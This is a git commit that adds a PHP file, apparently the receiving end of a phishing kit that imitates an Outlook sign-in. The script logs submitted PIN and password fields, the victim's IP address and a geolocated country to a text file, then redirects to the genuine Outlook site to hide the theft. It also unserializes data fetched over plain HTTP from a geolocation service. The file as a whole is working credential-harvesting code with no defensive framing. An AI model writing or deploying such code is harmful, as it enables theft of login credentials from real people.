7c2b67020e47b3c6ab937a75e92adb087039223e
arthur6612 <arthur_6612@hotmail.com>
2024-10-24 16:57:55 -0600

    Add files via upload

---
+++ index1.php
@@ -0,0 +1,16 @@
+<?php
+ini_set("display_errors", 0);
+$userp = $_SERVER['REMOTE_ADDR'];
+
+date_default_timezone_set('America/Bogota');
+@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
+@$pais = $meta['geoplugin_countryName']; 
+
+	$file = fopen("coronar.txt", "a");
+	
+
+fwrite($file, " - Pin : ".$_POST['namee']." - Pin2 : ".$_POST['pwss']." - ".date('d/m/Y')." ".$userp." ".$pais."" . PHP_EOL);
+
+
+Header ("Location: https://outlook.live.com/owa/");
+?>
